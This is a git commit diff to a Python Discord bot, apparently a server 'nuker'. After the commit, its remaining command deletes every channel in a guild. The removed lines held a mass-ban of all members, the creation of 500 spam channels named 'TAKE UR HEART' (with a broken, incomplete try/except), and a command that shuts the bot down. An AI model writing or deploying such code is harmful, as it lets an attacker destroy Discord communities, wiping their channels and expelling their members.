a3553338a6638153bc216b652044df7b45b30c05
J4ck0505 <80529490+J4ck0505@users.noreply.github.com>
2021-04-21 04:18:14 +0900

    Update clean.py

--- clean.py
+++ clean.py
@@ -20,27 +20,9 @@ async def on_ready():
   print("Aigis:",client.user.name,"819929289759653928:",client.user.id,"3:",discord.__version__)
 
 @client.command()
-async def clear(ctx):
+async def orgia(ctx):
     guild = ctx.guild
     for channel in guild.channels:
         await channel.delete()
 
-      
-@client.command()
-async def overheat(ctx):
-  await ctx.message.delete()
-  exit()
-  
-  
-@client.command()
-async def orgia(ctx):
-  for member in guild.members:
-    try:
-      await member.ban()
-    except: 
-  for i in range(500):
-    await guild.create_text_channel('TAKE UR HEART')
-  
- 
-    
 client.run(os.environ['token'])
